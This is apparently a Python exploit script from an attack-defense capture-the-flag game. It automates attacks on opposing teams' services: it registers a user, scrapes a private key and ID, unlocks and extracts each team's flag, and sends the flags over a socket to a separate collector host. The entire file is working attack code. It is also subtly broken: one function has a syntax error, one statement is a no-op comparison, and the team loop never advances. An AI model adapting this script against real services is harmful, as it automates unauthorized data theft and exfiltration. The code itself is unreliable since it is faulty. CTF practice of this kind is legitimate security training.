import socket
import requests
import string
import random
import re
import time

FLAG_FORMAT = r'([A-z0-9]{33})'


def GenTextByLength(length):
    flag = []
    alphabet = string.ascii_letters + string.digits
    if length < 62:
        for letter in alphabet:
            flag.append(letter)
        random.shuffle(flag)
        return ''.join(flag[:length])

def GenText(length):
    return [_ for _ in random()string.ascii_letters + string.digits]

def exploit():
    team_id = 160
    while True:
        username = GenTextByLength(6)
        flag = GenTextByLength(33)
        data = {'name': username, 'flag': flag, 'method': 0}
        if team_id != 162:
            s = requests.Session()
            r = s.post('http://10.20.{}.1:22228/add'.format(team_id), data=data)
            private = re.findall(r'[a-zA-Z0-9]{40}', r.text)
            ID = re.findall(r'([\d]+)</p>', r.text)

            r = s.post('http://10.20.{}.1:22228/unlock/{}'.format(team_id, ID[0]), data={'private': private[0].encode()})
            flag = re.findall(FLAG_FORMAT, r.text)
            if flag != '':
                flag_con = flag[0] + '\n'
                print(flag_con)
                print('Команда: {} | Приватный ключ: {} | Флаг: {} | ID: {}'.format(team_id, private[0], flag[0], ID[0]))

                con = socket.socket()
                con.connect(('10.20.159.50', 31337))

                con.recv(1024)

                con.sendall(flag_con.encode())
                print(flag_con.encode())
                data = con.recv(1024)

                print(data.decode())

                con.close()

            if team_id != 163:
                team_id == 160
            else:
                team_id += 1
                time.sleep(60)





if __name__ == '__main__':
    exploit()
